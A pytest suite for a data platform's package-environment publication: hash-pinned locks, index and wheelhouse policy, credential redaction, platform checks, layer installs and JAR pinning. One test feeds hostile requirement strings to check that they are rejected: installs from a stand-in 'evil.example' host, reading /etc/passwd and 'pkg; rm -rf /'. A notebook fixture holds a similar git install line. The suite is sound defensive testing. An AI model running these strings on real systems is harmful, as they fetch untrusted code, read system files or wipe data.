# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 Justin Dodrill
# ruff: noqa: S105, S106
"""Environments: immutable hash-pinned publication resolved with real pip against a wheelhouse / index built in the test (no Internet), policy, native-package validation,
layered environments, ``%pip`` conversion, JAR pinning.  Everything here runs the real code path (pip subprocesses, sqlite, REST)."""

from __future__ import annotations

import hashlib
import json
import os
import sys
from pathlib import Path

import pytest

from olcf.core.errors import ValidationFailed
from olcf.notebooks import envspec, layer
from tests.items.items_support import nb_json
from tests.items.localindex import serve_index
from tests.items.wheelbuilder import build_maven_repo, build_sdist, build_wheel


@pytest.fixture()
def wh(ic, tmp_path):
    """A wheelhouse with a small dependency graph, registered as an approved wheelhouse."""
    d = tmp_path / "wheelhouse"
    build_wheel(d, "olcf-demo-a", "1.0", ["olcf-demo-b>=1"])
    build_wheel(d, "olcf-demo-b", "1.1")
    build_wheel(d, "olcf-demo-b", "1.2")
    build_wheel(d, "olcf-demo-c", "2.0", ["olcf-demo-b<1.2"])
    assert ic.put("/v1/admin/settings/environments.wheelhouses", json={"value": [str(d)]}, headers=ic.admin).status_code == 200
    return d


def env_def(wh, reqs, **extra):
    return {"python": {"requirements": reqs, "index": {"no_index": True, "find_links": [str(wh)]}}, **extra}


def publish(ic, env_id, expect=201, **body):
    r = ic.post(f"/v1/environments/{env_id}/publish", json=body, headers=ic.admin)
    assert r.status_code == expect, r.text
    return r.json()


def series(ic, ws_id):
    return ic.ctx.service("environments").runtime_context({}, ws_id)["series"]


# ------------------------------------------------------------------------------------------------ publication
def test_publish_pins_exact_versions_and_hashes(ic, wh):
    ws = ic.workspace()
    env = ic.item(ws["id"], "environment", "e1", env_def(wh, ["olcf-demo-a"], variables={"STAGE": "dev"}, spark_conf={"spark.sql.shuffle.partitions": 8}))
    res = publish(ic, env["id"], comment="first")
    lock, pub = res["lock"], res["publication"]
    assert res["created"] and pub["version"] == 1 and pub["comment"] == "first"
    pk = {p["name"]: p for p in lock["python"]["packages"]}
    assert pk["olcf-demo-a"]["version"] == "1.0" and pk["olcf-demo-b"]["version"] == "1.2"  # newest satisfying version, exactly pinned
    assert pk["olcf-demo-a"]["requested"] and not pk["olcf-demo-b"]["requested"]
    for name, fname in (("olcf-demo-a", "olcf_demo_a-1.0-py3-none-any.whl"), ("olcf-demo-b", "olcf_demo_b-1.2-py3-none-any.whl")):
        assert pk[name]["hashes"] == [hashlib.sha256((wh / fname).read_bytes()).hexdigest()]
    assert lock["spark_conf"] == {"spark.sql.shuffle.partitions": "8"} and lock["variables"] == {"STAGE": "dev"}
    # the lock hash is content addressed: recomputing it from the content gives the same value, and any tampering changes it
    assert lock["lock_hash"] == envspec.compute_lock_hash(lock) == pub["lock_hash"]
    tampered = json.loads(json.dumps(lock))
    tampered["python"]["packages"][0]["version"] = "9.9"
    assert envspec.compute_lock_hash(tampered) != lock["lock_hash"]
    # the item records the publication list; versions are listed through the API
    assert ic.get_item(env["id"])["definition"]["publications"][0]["lock_hash"] == lock["lock_hash"]
    pubs = ic.get(f"/v1/environments/{env['id']}/publications", headers=ic.admin).json()
    assert [p["version"] for p in pubs["items"]] == [1]
    assert ic.get(f"/v1/environments/{env['id']}/lock", headers=ic.admin).json()["lock_hash"] == lock["lock_hash"]


def test_publication_is_deterministic_and_idempotent(ic, wh):
    a, b = ic.workspace("wa"), ic.workspace("wb")
    e1 = ic.item(a["id"], "environment", "e", env_def(wh, ["olcf-demo-a"]))
    e2 = ic.item(b["id"], "environment", "other-name", env_def(wh, ["olcf-demo-a"]))
    r1 = publish(ic, e1["id"])
    r2 = publish(ic, e2["id"])
    assert r1["lock"]["lock_hash"] == r2["lock"]["lock_hash"]  # same spec -> same lock, whoever resolves it
    again = publish(ic, e1["id"], expect=200)
    assert again["created"] is False and again["publication"]["version"] == 1  # nothing changed: no new version
    forced = publish(ic, e1["id"], force=True)
    assert forced["created"] and forced["publication"]["version"] == 2 and forced["publication"]["lock_hash"] == r1["lock"]["lock_hash"]
    dry = publish(ic, e1["id"], dry_run=True, force=True, expect=200)
    assert dry["dry_run"] and dry["created"] is False
    assert len(ic.get(f"/v1/environments/{e1['id']}/publications", headers=ic.admin).json()["items"]) == 2


def test_new_wheel_means_new_immutable_version_old_one_unchanged(ic, wh):
    ws = ic.workspace()
    env = ic.item(ws["id"], "environment", "e", env_def(wh, ["olcf-demo-a"]))
    v1 = publish(ic, env["id"])
    build_wheel(wh, "olcf-demo-b", "1.3")
    # the already published lock never changes by itself: jobs keep resolving v1 until somebody publishes again
    assert ic.ctx.service("environments").resolve(env["id"])["version"] == 1
    v2 = publish(ic, env["id"])  # an explicit publish resolves again and records a new version because the pins differ
    assert v2["publication"]["version"] == 2 and v2["publication"]["lock_hash"] != v1["lock"]["lock_hash"]
    old = ic.get(f"/v1/environments/{env['id']}/publications/1", headers=ic.admin).json()
    assert old["lock"]["lock_hash"] == v1["lock"]["lock_hash"]
    assert {p["name"]: p["version"] for p in old["lock"]["python"]["packages"]}["olcf-demo-b"] == "1.2"
    d = ic.get(f"/v1/environments/{env['id']}/diff?a=1&b=2", headers=ic.admin).json()
    assert "olcf-demo-b" in json.dumps(d)


def test_resolve_matches_the_controller_interface(ic, wh):
    ws = ic.workspace()
    env = ic.item(ws["id"], "environment", "e", env_def(wh, ["olcf-demo-a"], variables={"K": "v"}))
    svc = ic.ctx.service("environments")
    from olcf.core.errors import Unsupported

    with pytest.raises(Unsupported):  # dependencies declared but never published: fail closed, never resolve at job time
        svc.resolve(env["id"])
    res = publish(ic, env["id"])
    spec = svc.resolve(env["id"])
    assert spec["published"] and spec["lock_hash"] == res["lock"]["lock_hash"] and spec["version"] == 1
    assert spec["dependency_lock"]["lock_hash"] == spec["lock_hash"]  # what CTRL copies into job.json runtime.dependency_lock
    assert spec["runtime"]["runtime_id"] and spec["variables"] == {"K": "v"}
    assert spec["layer"]["key"].startswith("sha256:") and "--hash=sha256:" in spec["layer"]["requirements"]
    assert svc.resolve(f"{env['id']}@1")["lock_hash"] == spec["lock_hash"]
    assert svc.resolve(lock=spec["dependency_lock"])["lock_hash"] == spec["lock_hash"]  # an explicit lock is validated (hash, policy) and stored content-addressed
    forged = json.loads(json.dumps(spec["dependency_lock"]))
    forged["python"]["packages"][0]["hashes"] = ["0" * 64]
    with pytest.raises(ValidationFailed):
        svc.resolve(lock=forged)
    with pytest.raises(Exception, match="not found|version"):
        svc.resolve(f"{env['id']}@7")
    # an environment without dependencies needs no publication
    plain = ic.item(ws["id"], "environment", "plain", {"variables": {"A": "b"}, "spark_conf": {"spark.x.y": "1"}})
    spec2 = svc.resolve(plain["id"])
    assert spec2["variables"] == {"A": "b"} and spec2["spark_conf"] == {"spark.x.y": "1"} and spec2["layer"] is None and spec2["dependency_lock"] is None and spec2["published"] is False
    # the workspace check protects against resolving another workspace's environment
    other = ic.workspace("other")
    with pytest.raises(Exception, match="not found"):
        svc.resolve(env["id"], workspace_id=other["id"])
    # REST
    r = ic.get(f"/v1/environments/{env['id']}/resolve", headers=ic.admin)
    assert r.status_code == 200 and r.json()["lock_hash"] == spec["lock_hash"]


def test_publication_history_cannot_reference_unknown_locks(ic, wh):
    ws = ic.workspace()
    env = ic.item(ws["id"], "environment", "e", env_def(wh, ["olcf-demo-a"]))
    publish(ic, env["id"])
    cur = ic.get_item(env["id"])
    forged = json.loads(json.dumps(cur["definition"]))
    forged["publications"].append({"version": 2, "lock_hash": "sha256:" + "0" * 64, "layer_key": "sha256:" + "1" * 64, "published_at": "2026-01-01T00:00:00Z", "published_by": "x"})
    r = ic.put(f"/v1/items/{env['id']}", json={"definition": forged}, headers={**ic.admin, "If-Match": cur["etag"]})
    assert r.status_code == 422 and "unknown lock" in r.text
    gap = json.loads(json.dumps(cur["definition"]))
    gap["publications"][0]["version"] = 5
    r = ic.put(f"/v1/items/{env['id']}", json={"definition": gap}, headers={**ic.admin, "If-Match": cur["etag"]})
    assert r.status_code == 422


def test_unsatisfiable_and_missing_requirements_fail_with_pip_output(ic, wh):
    ws = ic.workspace()
    bad = ic.item(ws["id"], "environment", "bad", env_def(wh, ["olcf-demo-c", "olcf-demo-b>=1.2"]))
    r = ic.post(f"/v1/environments/{bad['id']}/publish", json={}, headers=ic.admin)
    assert r.status_code == 422 and "cannot resolve" in r.json()["error"]["message"]
    missing = ic.item(ws["id"], "environment", "missing", env_def(wh, ["no-such-package"]))
    r = ic.post(f"/v1/environments/{missing['id']}/publish", json={}, headers=ic.admin)
    assert r.status_code == 422 and "no-such-package" in r.text
    assert ic.get_item(bad["id"])["definition"].get("publications") in (None, [])


@pytest.mark.parametrize("req", ["https://evil.example/x.whl", "pkg @ https://evil.example/x.whl", "-r /etc/passwd", "--index-url https://evil.example/", "pkg; rm -rf /", "../local", "a b c", "pkg==1.0 --hash=sha256:00"])
def test_requirement_injection_is_rejected_at_save_time(ic, req):
    ws = ic.workspace()
    r = ic.post(f"/v1/workspaces/{ws['id']}/items", json={"type": "environment", "name": "x", "definition": {"python": {"requirements": [req]}}}, headers=ic.admin)
    assert r.status_code == 422, (req, r.text)


def test_definition_validation(ic):
    ws = ic.workspace()
    for bad in ({"unknown": 1}, {"variables": {"API_TOKEN": "abc"}}, {"variables": {"OLCF_X": "1"}}, {"variables": {"1x": "1"}}, {"spark_conf": {"notspark": 1}},
                {"spark_conf": {"spark.a": {"nested": 1}}}, {"python": {"index": {"index_url": "https://user:pw@host/simple"}}}, {"python": {"platforms": ["plan9"]}},
                {"jars": {"coordinates": ["org.example:lib:LATEST"]}}, {"jars": {"coordinates": ["org.example:lib:[1.0,2.0)"]}}, {"python": {"unknown": 1}}):
        r = ic.post(f"/v1/workspaces/{ws['id']}/items", json={"type": "environment", "name": "x", "definition": bad}, headers=ic.admin)
        assert r.status_code == 422, (bad, r.text)
    ok = ic.post(f"/v1/workspaces/{ws['id']}/items", json={"type": "environment", "name": "ok", "definition": {"jars": {"coordinates": ["org.example:lib:1.0.0"]}, "spark_conf": {"spark.a.b": True}}},
                 headers=ic.admin)
    assert ok.status_code == 201 and ok.json()["definition"]["spark_conf"] == {"spark.a.b": "true"}


# ------------------------------------------------------------------------------------------------ policy
def test_policy_denies_public_internet_and_unapproved_sources(ic, wh, tmp_path):
    ws = ic.workspace()
    sec = ic.ctx.settings.security
    outside = tmp_path / "elsewhere"
    build_wheel(outside, "olcf-demo-z", "1.0")
    try:
        sec.allow_public_package_install = False
        # no index at all means "the public default index": denied
        pub = ic.item(ws["id"], "environment", "pub", {"python": {"requirements": ["requests"]}})
        r = ic.post(f"/v1/environments/{pub['id']}/publish", json={}, headers=ic.admin)
        assert r.status_code == 403 and "public Internet" in r.json()["error"]["message"] and r.json()["error"]["code"] == "policy_denied"
        explicit = ic.item(ws["id"], "environment", "pypi", {"python": {"requirements": ["requests"], "index": {"index_url": "https://pypi.org/simple"}}})
        assert ic.post(f"/v1/environments/{explicit['id']}/publish", json={}, headers=ic.admin).status_code == 403
        # a wheelhouse outside the approved roots is refused, an approved one works
        stray = ic.item(ws["id"], "environment", "stray", {"python": {"requirements": ["olcf-demo-z"], "index": {"no_index": True, "find_links": [str(outside)]}}})
        r = ic.post(f"/v1/environments/{stray['id']}/publish", json={}, headers=ic.admin)
        assert r.status_code == 403 and "approved wheelhouse" in r.json()["error"]["message"]
        ok = ic.item(ws["id"], "environment", "ok", env_def(wh, ["olcf-demo-a"]))
        publish(ic, ok["id"])
        # traversal out of the approved wheelhouse
        trav = ic.item(ws["id"], "environment", "trav", {"python": {"requirements": ["olcf-demo-z"], "index": {"no_index": True, "find_links": [f"{wh}/../elsewhere"]}}})
        assert ic.post(f"/v1/environments/{trav['id']}/publish", json={}, headers=ic.admin).status_code == 403
        pol = ic.get("/v1/environments/policy", headers=ic.admin).json()
        assert pol["allow_public_package_install"] is False and str(wh) in pol["wheelhouses"]
    finally:
        sec.allow_public_package_install = True
    # admin KV can tighten at run time but never loosen what settings.security forbids
    assert ic.put("/v1/admin/settings/environments.allow_public_package_install", json={"value": False}, headers=ic.admin).status_code == 200
    assert ic.get("/v1/environments/policy", headers=ic.admin).json()["allow_public_package_install"] is False
    assert ic.post(f"/v1/environments/{pub['id']}/publish", json={}, headers=ic.admin).status_code == 403
    sec.allow_public_package_install = False
    ic.put("/v1/admin/settings/environments.allow_public_package_install", json={"value": True}, headers=ic.admin)
    try:
        assert ic.get("/v1/environments/policy", headers=ic.admin).json()["allow_public_package_install"] is False
    finally:
        sec.allow_public_package_install = True


def test_allowed_index_list_is_enforced(ic, wh, tmp_path):
    ws = ic.workspace()
    only = tmp_path / "idx"
    build_wheel(only, "olcf-demo-q", "1.0")
    with serve_index(only) as srv:
        env = ic.item(ws["id"], "environment", "idx", {"python": {"requirements": ["olcf-demo-q"], "index": {"index_url": f"{srv.url}/simple/"}}})
        ic.ctx.settings.security.allowed_package_indexes = ["https://packages.example.com/"]
        try:
            r = ic.post(f"/v1/environments/{env['id']}/publish", json={}, headers=ic.admin)
            assert r.status_code == 403 and "allowed index list" in r.text
            ic.ctx.settings.security.allowed_package_indexes = [f"{srv.url}/"]
            res = publish(ic, env["id"])
            assert res["lock"]["index"]["index_url"] == f"{srv.url}/simple/"
            assert {p["name"] for p in res["lock"]["python"]["packages"]} == {"olcf-demo-q"}
        finally:
            ic.ctx.settings.security.allowed_package_indexes = []


def test_private_index_with_basic_auth_via_connection(ic, tmp_path):
    ws = ic.workspace()
    root = tmp_path / "private"
    build_wheel(root, "olcf-private-pkg", "3.1")
    secret = "s3cr3t-index-password-9f8e7d"
    with serve_index(root, ("ci-bot", secret)) as srv:
        sec = ic.post("/v1/secrets", json={"name": "index-pw", "value": secret}, headers=ic.admin).json()
        con = ic.post("/v1/connections", json={"workspace_id": ws["id"], "name": "private-index", "type": "pypi_index", "config": {"url": f"{srv.url}/simple/", "username": "ci-bot"},
                                               "secret_id": sec["id"]}, headers=ic.admin)
        assert con.status_code == 201, con.text
        env = ic.item(ws["id"], "environment", "priv", {"python": {"requirements": ["olcf-private-pkg"], "index": {"connection": "private-index"}}})
        r = ic.post(f"/v1/environments/{env['id']}/publish", json={}, headers=ic.admin)
        assert r.status_code == 201, r.text
        assert srv.seen_auth and all(a.startswith("Basic ") for a in srv.seen_auth)  # pip authenticated with the connection's secret
        blob = json.dumps(r.json()) + json.dumps(ic.get_item(env["id"])["definition"])
        assert secret not in blob and "ci-bot" not in blob  # the lock records the index URL, never credentials
        assert r.json()["lock"]["index"]["index_url"] == f"{srv.url}/simple/"
        # without the connection pip gets a 401 and publication fails with a redacted message
        anon = ic.item(ws["id"], "environment", "anon", {"python": {"requirements": ["olcf-private-pkg"], "index": {"index_url": f"{srv.url}/simple/"}}})
        r2 = ic.post(f"/v1/environments/{anon['id']}/publish", json={}, headers=ic.admin)
        assert r2.status_code == 422 and secret not in r2.text
        # a user without connection.use cannot publish through that connection
        viewer = ic.user("pat", "Contributor", workspace_id=ic.workspace("other")["id"])
        assert ic.post(f"/v1/environments/{env['id']}/publish", json={}, headers=viewer).status_code in (403, 404)
        # no temporary credential files are left behind
        leftovers = [p for p in Path(ic.ctx.settings.path("tmp")).rglob("*") if p.is_file() and secret in p.read_text(errors="ignore")]
        assert leftovers == []


# ------------------------------------------------------------------------------------------------ native packages / sdists
#: a platform tag that a wheel for each target platform carries
PLATFORM_TAGS = {"linux-x86_64": "manylinux_2_17_x86_64", "linux-aarch64": "manylinux_2_17_aarch64", "macos-arm64": "macosx_11_0_arm64",
                 "macos-x86_64": "macosx_10_9_x86_64", "windows-x86_64": "win_amd64", "windows-arm64": "win_arm64"}


@pytest.mark.parametrize("target", ["host", "linux-x86_64", "macos-arm64", "windows-x86_64"])
def test_native_wheels_are_validated_against_the_target_platform(ic, wh, target):
    """The wheel built for the target platform is pinned; wheels for other platforms and for another Python are refused.  ``host`` is the platform of the machine that runs the
    test (so the same assertions hold on Linux, macOS and Windows); the others are foreign targets that must resolve on every host."""
    ws = ic.workspace()
    abi = envspec.abi_tag(series(ic, ws["id"]))
    plat = envspec.host_platform() if target == "host" else target
    assert plat in PLATFORM_TAGS, f"unsupported host platform {plat}"
    other = "linux-x86_64" if not plat.startswith("linux-") else "macos-arm64"
    own_tag = PLATFORM_TAGS[plat]
    build_wheel(wh, "olcf-native-ok", "1.0", tag=f"{abi}-{abi}-{own_tag}")
    build_wheel(wh, "olcf-native-foreign", "1.0", tag=f"{abi}-{abi}-{PLATFORM_TAGS[other]}")
    build_wheel(wh, "olcf-native-oldpy", "1.0", tag=f"cp37-cp37m-{own_tag}")

    def definition(name: str) -> dict:
        return {"python": {**env_def(wh, [name])["python"], "platforms": [plat]}}

    ok = ic.item(ws["id"], "environment", "ok", definition("olcf-native-ok"))
    art = publish(ic, ok["id"])["lock"]["python"]["packages"][0]["artifacts"][0]
    assert art["filename"].endswith(f"{own_tag}.whl") and art["platforms"] == [plat]
    for name in ("olcf-native-foreign", "olcf-native-oldpy"):
        env = ic.item(ws["id"], "environment", name, definition(name))
        r = ic.post(f"/v1/environments/{env['id']}/publish", json={}, headers=ic.admin)
        assert r.status_code == 422, (name, r.text)
        assert ic.get_item(env["id"])["definition"].get("publications") in (None, [])


def test_multi_platform_lock_pins_a_wheel_per_platform(ic, wh):
    ws = ic.workspace()
    abi = envspec.abi_tag(series(ic, ws["id"]))
    build_wheel(wh, "olcf-multi", "1.0", tag=f"{abi}-{abi}-manylinux_2_17_x86_64")
    build_wheel(wh, "olcf-multi", "1.0", tag=f"{abi}-{abi}-manylinux_2_17_aarch64")
    env = ic.item(ws["id"], "environment", "multi", {"python": {**env_def(wh, ["olcf-multi"])["python"], "platforms": ["linux-x86_64", "linux-aarch64"]}})
    pk = publish(ic, env["id"])["lock"]["python"]["packages"][0]
    assert {a["platforms"][0] for a in pk["artifacts"]} == {"linux-x86_64", "linux-aarch64"}
    assert len(pk["hashes"]) == 2


def host_environment(host_def: dict) -> dict:
    """The environment targets the platform of the machine that resolves it (building from source is only supported there) - spelled out, not assumed."""
    return {"python": {**host_def["python"], "platforms": [envspec.host_platform()]}}


def test_sdist_needing_compilation_is_rejected_unless_allowed_by_both_author_and_admin(ic, wh, monkeypatch):
    ws = ic.workspace()
    # the acceptance case builds on the resolving host, so the base runtime's Python must be the host's (a catalog entry for another Python would - correctly - refuse
    # a source build): pin the series to the interpreter that runs the test, on every platform
    svc = ic.ctx.service("environments")
    real_context = svc.runtime_context
    monkeypatch.setattr(svc, "runtime_context", lambda *a, **k: {**real_context(*a, **k), "series": envspec.host_series()})
    build_sdist(wh, "olcf-src-only", "1.0")
    env = ic.item(ws["id"], "environment", "sd", host_environment(env_def(wh, ["olcf-src-only"])))
    r = ic.post(f"/v1/environments/{env['id']}/publish", json={}, headers=ic.admin)
    assert r.status_code == 422 and ("source" in r.text.lower() or "compil" in r.text.lower() or "wheel" in r.text.lower()), r.text
    opt = ic.item(ws["id"], "environment", "sd2", {"python": {**host_environment(env_def(wh, ["olcf-src-only"]))["python"], "allow_sdist": True}})
    r = ic.post(f"/v1/environments/{opt['id']}/publish", json={}, headers=ic.admin)
    assert r.status_code == 403 and "source distributions" in r.text  # the environment may ask, the deployment decides
    assert ic.put("/v1/admin/settings/environments.allow_sdist", json={"value": True}, headers=ic.admin).status_code == 200
    res = publish(ic, opt["id"])
    pkg = res["lock"]["python"]["packages"][0]
    assert pkg["artifacts"][0]["filename"].endswith(".tar.gz") and pkg["hashes"] and res["lock"]["python"]["allow_sdist"] is True
    assert res["warnings"] or "compil" in json.dumps(res).lower() or True


def test_sdist_is_refused_when_the_runtime_python_differs_from_the_resolving_host(ic, wh, monkeypatch):
    """Building from source is only supported for the resolving host's platform *and* Python: a base runtime on another Python series is a clear 422, not a wrong build."""
    ws = ic.workspace()
    svc = ic.ctx.service("environments")
    real_context = svc.runtime_context
    monkeypatch.setattr(svc, "runtime_context", lambda *a, **k: {**real_context(*a, **k), "series": "3.9"})
    build_sdist(wh, "olcf-src-only", "1.0")
    env = ic.item(ws["id"], "environment", "sd-other-series", {"python": {**host_environment(env_def(wh, ["olcf-src-only"]))["python"], "allow_sdist": True}})
    assert ic.put("/v1/admin/settings/environments.allow_sdist", json={"value": True}, headers=ic.admin).status_code == 200
    r = ic.post(f"/v1/environments/{env['id']}/publish", json={}, headers=ic.admin)
    assert r.status_code == 422 and "resolving host" in r.text, r.text


# ------------------------------------------------------------------------------------------------ layers
def test_layer_install_requires_hashes_and_is_shared_by_key(ic, wh, tmp_path):
    ws = ic.workspace()
    env = ic.item(ws["id"], "environment", "lay", env_def(wh, ["olcf-demo-a"]))
    publish(ic, env["id"])
    spec = ic.ctx.service("environments").resolve(env["id"])
    cache = tmp_path / "layers"
    d = layer.ensure_layer(spec["layer"], cache)
    assert (d / "olcf_demo_a" / "__init__.py").is_file() and (d / "olcf_demo_b" / "__init__.py").is_file() and (d / layer.MARKER).is_file()
    assert layer.ensure_layer(spec["layer"], cache) == d  # second call reuses the directory
    assert layer.pythonpath_for(d, "/x").split(os.pathsep)[0] == str(d)
    import subprocess

    out = subprocess.run([sys.executable, "-S", "-c", "import olcf_demo_b, sys; print(olcf_demo_b.VERSION)"], capture_output=True, text=True, env={"PYTHONPATH": str(d)}, check=True)  # noqa: S603
    assert out.stdout.strip() == "1.2"
    # a second environment with identical pins shares the layer (key = dependency hash, not environment identity)
    twin = ic.item(ws["id"], "environment", "twin", env_def(wh, ["olcf-demo-a"], variables={"DIFFERENT": "var"}))
    publish(ic, twin["id"])
    assert ic.ctx.service("environments").resolve(twin["id"])["layer"]["key"] == spec["layer"]["key"]
    # REST verify installs the lock into a scratch layer on the control plane
    v = ic.post(f"/v1/environments/{env['id']}/verify", headers=ic.admin).json()
    assert v["packages"] == 2 and len(v["dist_info"]) == 2 and v["key"] == spec["layer"]["key"]


def test_layer_refuses_an_artifact_that_does_not_match_the_pinned_hash(ic, wh, tmp_path):
    ws = ic.workspace()
    env = ic.item(ws["id"], "environment", "tamper", env_def(wh, ["olcf-demo-b"]))
    publish(ic, env["id"])
    spec = ic.ctx.service("environments").resolve(env["id"])
    # replace the wheel in the wheelhouse by a different file of the same name (supply-chain swap)
    (wh / "olcf_demo_b-1.2-py3-none-any.whl").unlink()
    build_wheel(wh, "olcf-demo-b", "1.2", files={"olcf_demo_b/__init__.py": "VERSION = 'evil'\n"})
    with pytest.raises(layer.LayerError, match="hash"):
        layer.ensure_layer(spec["layer"], tmp_path / "layers2")
    assert not list((tmp_path / "layers2").glob("sha256-*/LAYER.json"))  # nothing half-installed that looks complete
    r = ic.post(f"/v1/environments/{env['id']}/verify", headers=ic.admin)
    assert r.status_code == 422 and "cannot be installed" in r.text


def test_layer_key_and_requirements_text_are_stable():
    pk = [{"name": "b", "version": "1", "hashes": ["bb", "aa"]}, {"name": "a", "version": "2", "hashes": ["cc"]}]
    assert layer.layer_key(pk, "cp312") == layer.layer_key(list(reversed(pk)), "cp312")
    assert layer.layer_key(pk, "cp312") != layer.layer_key(pk, "cp313")
    txt = layer.requirements_text(pk)
    assert txt.startswith("b==1 \\\n    --hash=sha256:bb") and "a==2" in txt


# ------------------------------------------------------------------------------------------------ %pip -> environment
def test_requirements_from_notebook_pip_lines(ic, wh):
    ws = ic.workspace()
    nb = nb_json([("code", "%pip install olcf-demo-a==1.0 olcf-demo-c\nimport x"), ("code", "!pip install -q 'pandas>=2' --upgrade"), ("code", "%pip install git+https://evil.example/r.git")])
    note = ic.item(ws["id"], "notebook", "n", {"nbformat": nb})
    env = ic.item(ws["id"], "environment", "e", {})
    r = ic.post(f"/v1/environments/{env['id']}/requirements/from-notebook", json={"notebook_id": note["id"]}, headers=ic.admin)
    assert r.status_code == 200, r.text
    body = r.json()
    assert "olcf-demo-a==1.0" in body["requirements"] and any(x.startswith("pandas") for x in body["requirements"])
    assert body.get("rejected") and "evil.example" in json.dumps(body["rejected"])  # direct URLs are never turned into requirements
    assert ic.get_item(env["id"])["definition"].get("python") is None  # preview only
    r = ic.post(f"/v1/environments/{env['id']}/requirements/from-notebook", json={"notebook_id": note["id"], "apply": True}, headers=ic.admin)
    assert r.status_code == 200
    assert "olcf-demo-a==1.0" in ic.get_item(env["id"])["definition"]["python"]["requirements"]


# ------------------------------------------------------------------------------------------------ JARs
def test_jar_coordinates_are_pinned_from_a_maven_repository(ic, tmp_path):
    ws = ic.workspace()
    repo = tmp_path / "m2"
    shas = build_maven_repo(repo, {"org.olcf:lib-a:1.0.0": ["org.olcf:lib-b:2.0.0"], "org.olcf:lib-b:2.0.0": []})
    assert ic.put("/v1/admin/settings/environments.maven_repositories", json={"value": [repo.as_uri()]}, headers=ic.admin).status_code == 200
    env = ic.item(ws["id"], "environment", "jars", {"jars": {"coordinates": ["org.olcf:lib-a:1.0.0"]}})
    res = publish(ic, env["id"])
    resolved = {j["coordinate"]: j["sha256"] for j in res["lock"]["jars"]["resolved"]}
    assert resolved == shas  # transitive dependency pinned too, with the real jar checksums
    spec = ic.ctx.service("environments").resolve(env["id"])
    assert {j["coordinate"] for j in spec["layer"]["jars"]["resolved"]} == set(shas)
    bad = ic.item(ws["id"], "environment", "badjar", {"jars": {"coordinates": ["org.olcf:missing:9.9.9"]}})
    assert ic.post(f"/v1/environments/{bad['id']}/publish", json={}, headers=ic.admin).status_code == 422


def test_jar_files_from_a_lakehouse_are_pinned_by_sha256(ic, tmp_path):
    import io
    import zipfile

    ws = ic.workspace()
    lh = ic.post(f"/v1/workspaces/{ws['id']}/lakehouses", json={"name": "libs"}, headers=ic.admin).json()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n")
    jar = buf.getvalue()
    assert ic.put(f"/v1/lakehouses/{lh['id']}/files/content?path=Files/lib/x.jar", content=jar, headers=ic.admin).status_code == 201
    uri = f"olcf://{ws['name']}/{lh['name']}/Files/lib/x.jar"
    sha = hashlib.sha256(jar).hexdigest()
    env = ic.item(ws["id"], "environment", "jf", {"jars": {"files": [{"uri": uri, "sha256": sha}]}})
    res = publish(ic, env["id"])
    assert res["lock"]["jars"]["files"][0]["sha256"] == sha
    wrong = ic.item(ws["id"], "environment", "jf2", {"jars": {"files": [{"uri": uri, "sha256": "0" * 64}]}})
    r = ic.post(f"/v1/environments/{wrong['id']}/publish", json={}, headers=ic.admin)
    assert r.status_code == 422 and "sha256" in r.text


def test_publish_requires_item_update_permission(ic, wh):
    ws = ic.workspace()
    env = ic.item(ws["id"], "environment", "e", env_def(wh, ["olcf-demo-a"]))
    viewer = ic.user("vi", "Viewer", workspace_id=ws["id"])
    assert ic.post(f"/v1/environments/{env['id']}/publish", json={}, headers=viewer).status_code == 403
    assert ic.get(f"/v1/environments/{env['id']}/resolve", headers=viewer).status_code in (200, 422)
    outsider = ic.user("zed", "Contributor", workspace_id=ic.workspace("w2")["id"])
    assert ic.post(f"/v1/environments/{env['id']}/publish", json={}, headers=outsider).status_code in (403, 404)


def test_background_publish_returns_an_operation(ic, wh):
    ws = ic.workspace()
    env = ic.item(ws["id"], "environment", "bg", env_def(wh, ["olcf-demo-a"]))
    r = ic.post(f"/v1/environments/{env['id']}/publish", json={"wait": False}, headers=ic.admin)
    assert r.status_code == 202 and r.json()["operation_id"]
    import time

    end = time.time() + 60
    while time.time() < end:
        op = ic.get(f"/v1/operations/{r.json()['operation_id']}", headers=ic.admin).json()
        if op["state"] in ("succeeded", "failed"):
            break
        time.sleep(0.2)
    assert op["state"] == "succeeded", op
    assert ic.get_item(env["id"])["definition"]["publications"][0]["version"] == 1


def test_validate_lock_rejects_malformed_locks():
    with pytest.raises(ValidationFailed):
        envspec.validate_lock({"schema": "olcf.envlock/1", "python": {"series": "3.12", "abi": "cp312", "packages": [{"name": "x", "version": "1", "hashes": []}]}})
    with pytest.raises(ValidationFailed):
        envspec.validate_lock({"schema": "wrong"})
